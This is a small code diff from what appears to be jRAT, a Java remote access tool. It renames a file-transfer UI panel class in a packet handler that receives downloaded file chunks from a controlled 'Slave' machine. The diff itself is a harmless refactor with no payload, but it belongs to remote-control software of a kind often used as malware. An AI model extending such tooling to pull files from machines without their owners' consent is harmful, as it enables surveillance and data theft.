@@ -4,7 +4,7 @@ import java.io.DataInputStream;
 import java.io.File;
 
 import se.jrat.client.Slave;
-import se.jrat.client.ui.panels.PanelFileTransfer;
+import se.jrat.client.ui.panels.PanelFileTransfers;
 import se.jrat.common.io.FileCache;
 import se.jrat.common.io.TransferData;
 
@@ -29,7 +29,7 @@ public class Packet29ServerDownloadPart extends AbstractIncomingPacket {
 
 			data.getOutputStream().write(buffer);
 			data.increaseRead(buffer.length);
-			PanelFileTransfer.instance.repaint();
+			PanelFileTransfers.instance.repaint();
 		}
 	}
 
